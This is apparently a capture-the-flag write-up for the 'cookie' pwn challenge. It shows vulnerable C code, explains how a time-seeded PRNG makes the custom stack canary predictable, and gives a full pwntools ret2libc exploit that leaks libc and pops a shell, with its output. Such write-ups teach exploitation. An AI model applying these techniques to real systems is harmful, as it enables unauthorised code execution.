# [PWN] cookie

## Vulnerability

- Buffer overflow

- Seeding PRNG with a predictable value

## Source

```c
void gadgets() { asm("mov %rbp, %rdi;ret"); }

int main(void) {
  init();
  unsigned char cookie[64];
  unsigned char input[100];
  for (int i = 0; i < 64; i++) {
    unsigned char val = 'A' + (rand() % 26);
    cookie[i] = val;
    cookie_backup[i] = val;
  }
  puts(
      "The rest of the challenges were defeated because they did not have \n"
      "default protections enabled. Particularly stack cookies are a serious \n"
      "issue in software exploitation.\n");
  puts("Someone said that a x86-64 program stack cookie will have 7bytes of \n"
       "randomness + 1 null byte of wastage. Here I will make my custom \n"
       "implementation of cookie with 512 bits of randomness. Let's see how "
       "you tackle this challenge.\n");
  printf("Go head, speak into the void: ");
  scanf("%s", input);
  if (memcmp(cookie, cookie_backup, 64)) {
    puts("[ALERT] COOKIE IS TAMPERED! ABORTING...");
    exit(EXIT_FAILURE);
  }
  return EXIT_SUCCESS;
}
```

```c
void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  signal(SIGALRM, timeout);
  alarm(10);
  seed = time(0) >> 5;
  srand(seed);
}

```

# Exploit

The seed is the UNIX epoch timestamp divided by 32 (also rounded down to nearest integer). So this means it remains same for a timespan of 32 seconds. Which means for 32 seconds, any program generating random numbers with that seed, will generate the exact same sequence.

So we can create the exact same random sequence for ourselves and defeat the randomness of the custom canary implementation.

Next part is straightforward, since there is no `win()` function here, we need to use techniques like `ret2libc` to pop a shell.

But for that we need leak the address of libc itself. 

Luckily the program is compiled without PIE so we can use gadgets from the binary itself to print a resolved GOT entry (having a pointer to libc address) + *restart the program to maintain the state*.

Next we can utilise the info leak to do the `ret2libc` attack.

> TIP : Ensure to use libc from the given Dockerfile

```python
from pwn import *
import ctypes
import time

gs = '''
b * main+252
c
'''
exe = ELF('./cookie_patched')
context.terminal = ['tmux', 'splitw', '-h']

# io = process(exe.path)
io = remote("localhost", 50002)

libc = ctypes.CDLL('./libc.so.6')
libc.srand(int(time.time()) >> 5)
cookie = b''
for _ in range(64):
    cookie += (ord('A') + (libc.rand() % 26)).to_bytes()
libc = exe.libc

# gdb.attach(io, gdbscript=gs)
chain  = b''
chain += p64(0x000000000040101a) # ret
chain += p64(0x00000000004011ad) # pop rbp
chain += p64(exe.got['puts'])
chain += p64(0x0000000000401289) # mov rdi, rbp
chain += p64(exe.plt['puts'])
chain += p64(exe.sym['main'])
payload = flat({
    'daab': cookie,
    'zaac': chain
})
io.clean()
io.sendline(payload)
leak = u64( io.recv(6).ljust(8, b'\x00') )
log.info(f'{hex(leak) = }')
libc.address = leak - 0x87bd0
log.success(f'{hex(libc.address) = }')

chain  = b''
chain += p64(libc.address + 0x000000000002882f) # ret
chain += p64(libc.address + 0x000000000010f75b) # pop rdi
chain += p64(next(libc.search(b'/bin/sh\x00')))
chain += p64(libc.sym['system'])
payload = flat({
    'daab': cookie,
    'zaac': chain
})
io.sendline(payload)
io.clean()

io.interactive()

```

```shell
➜  solution python solve.py
[*] hex(leak) = '0x71d267287bd0'
[+] hex(libc.address) = '0x71d267200000'
[*] Switching to interactive mode
$ ls
cookie  flag.txt
$ cat flag.txt
DJSISACA{Wh475_7h3_pURP053_0F_r4Nd0MN355_1F_17_C4N_83_Pr3D1c73d}
```

## Flag

`DJSISACA{Wh475_7h3_pURP053_0F_r4Nd0MN355_1F_17_C4N_83_Pr3D1c73d}`


